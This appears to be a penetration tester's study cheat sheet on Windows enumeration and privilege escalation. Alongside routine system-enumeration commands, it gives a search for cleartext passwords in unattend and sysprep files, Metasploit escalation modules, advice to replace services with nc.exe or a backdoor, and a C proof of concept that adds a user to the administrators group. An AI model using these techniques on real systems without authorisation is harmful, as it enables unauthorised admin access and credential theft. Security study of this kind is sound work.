# Internal Enumeration - Windows

Many priv-esc techniques on windows comes from third-party programs and not necessarily windows in itself. Therefore it is important to really learn to enumerate the system and find those vulnerable programs.


http://netsec.ws/?cat=64

http://netsec.ws/?p=314

## Info about the system


schtasks /query /fo LIST /v
schtasks /query /fo LIST /v
net start
accesschk.exe -uwcqv "Authenticated Users" *
dir network-secret.txt /s
windump -i 2 -w capture -n -U -s 0 src not 10.11.0.X and dst not 10.11.0.X



```
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname

#Who am I?
whoami
echo %username%

#What users are on the machine?
net users

#More info about a specific user
net user user1
```

## Firewall

```
netsh firewall show state
netsh firewall show config
```

## Network

```
ipconfig /all

route print

#Display all available interfaces
arp -A
```

### Active connections

```
netstat -ano

#Firewall rules
netsh firewall show state
netsh firewall show config
```
So how should we interpret the netstat output? Here is an example, now what does this mena?

```
Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
```

**Important to understand**
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can recieve a connection from the network card, from the loopbak interface or any other interface. 

Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else.

Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. 

## Processes running

```
# The cronjob of windows
schtasks /query /fo LIST /v

# Running processes
tasklist /SVC
net start


# List all drivers
driverquery
```

## Users and domain

```
net users
net localgroups

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>
```

### List all patches

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## References

http://www.fuzzysecurity.com/tutorials/16.html


# Privilege escalation windows


https://www.reddit.com/r/AskNetsec/comments/3ujqu3/best_windows_privilege_escalation_resources/
"Enumeration.
You don't always need to run some exploit to get higher privileges, just convince some service that is running as admin or SYSTEM to open nc.exe for you. Web services are often misconfigured and running as admin or system.
Also look at modifying a startup service to run nc.exe or your malicious binary. replace UPnP with your backdoor.
Source: OSCP and OSCE; Never used exploits to get privilege escalation on the windows machines in the lab or exam"

Look for vulnerable services that may be running as system

## Metasploit - The easy way

So if you have a metasploit meterpreter session going you can run **getsystem**.

### Post modules

First you need to background the meterpreter shell and then you just run the post modules.
You can also try some different post modules. 

**Find weak service permissions**

```
use exploit/windows/local/service_permissions
```

## Manually

### Cleartext passwords

Can be find like this:
```
findstr /si password *.txt | *.xml | *.ini
```

Thse are common files to find them in. They might be base64-encoded. So look out for that. 

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

### Kernel exploits

Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. 

#### Python to binary

If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.

### Misconfigurations

#### Incorrect file and service permissions

If you find a service that has read-write permissions set to everyone you can just change that binary into a binary that adds a user to the administrators'group and thereby giving it privileges.

Here is a POC code for this

```c
#include <stdlib.h>
int main ()
{
int i;
i=system ("net localgroup administrators theusername /add");
return 0;
}
```

We then compile it with out cross-compiler, if you are on linux, like this:

```
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```


### Unquoted Service Paths

This attack is explained here:
http://toshellandback.com/2015/11/24/ms-priv-esc/

There is also a metasploit module for this is: exploit/windows/local/trusted_service_path


### Vulnerable Services

#### Service Binaries

#### Windows Services


### AlwaysInstallElevated

http://toshellandback.com/2015/11/24/ms-priv-esc/

### Unattended Installs


### Group Policy Preferences (GPP)



Most recommended article

http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
http://www.fuzzysecurity.com/tutorials/16.html

https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html

https://github.com/gentilkiwi/mimikatz

http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html

https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be

https://www.youtube.com/watch?v=PC_iMqiuIRQ

http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/

https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

http://pwnwiki.io/#!privesc/windows/index.md